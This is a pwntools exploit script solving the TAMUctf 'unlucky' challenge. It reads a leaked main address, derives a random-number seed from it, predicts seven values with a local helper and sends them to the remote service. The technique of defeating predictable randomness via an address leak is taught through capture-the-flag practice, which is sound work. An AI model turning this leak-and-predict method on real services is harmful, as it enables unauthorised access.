#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template unlucky --host tamuctf.com --port 443
from pwn import *
import subprocess

# Set up pwntools for the correct architecture
exe = context.binary = ELF('unlucky')
pty = process.PTY
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'tamuctf.com'
port = int(args.PORT or 443)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, stdout=pty, stdin=pty, *a, **kw)
    if args.EDB:
        return process(["edb", "--run", exe.path] + argv, stdout=pty, stdin=pty, *a, **kw)
    else:
        return process([exe.path] + argv, stdout=pty, stdin=pty, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port,ssl=True, sni="unlucky")
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.recvuntil("Here's a lucky number: ")
addr = io.recvuntil("\n").split()[0]
seed = int(addr[6:], 16) + 0x2ec3

log.info("Main address: " + hex(int(addr, 16)))
log.info("Seed: " + str(seed))

output = subprocess.check_output(['./rand', f'{str(seed)}'])
nums = output.decode().split('\n')
log.info('Nums: ' + str(nums))

for i in range(1, 8):
    io.sendlineafter(f'#{i}:', nums[i-1])

io.interactive()

